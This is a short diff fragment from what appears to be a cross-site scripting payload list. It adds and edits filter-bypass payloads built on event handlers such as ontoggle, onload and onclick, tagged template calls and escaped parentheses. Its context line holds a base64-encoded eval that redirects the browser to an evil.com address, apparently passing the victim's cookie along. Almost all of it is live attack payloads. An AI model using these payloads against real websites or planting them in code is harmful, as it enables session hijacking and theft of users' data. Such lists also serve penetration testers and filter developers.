@@ -64,7 +64,8 @@ eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9ldmlsLmNvbTo4MDkwL3IucGhwP2M9Iitkb
 <details/open/ontoggle="a=alert;a`1`">
 <details/open/ontoggle="a=eval,b=alert,c=b`1`,a`b`">
 > <svg / on </ script> load = alert`1`>
-> <svg / on </ script> load = alert（1）>
+> <svg / on </ script> load = alert(1)>
+<d3"<"/onclick="1>[confirm``]"<">z
 绕过（）：setTimeout`alert\x28document.domain\x29`
 "-prompt`1` - "//
 ```
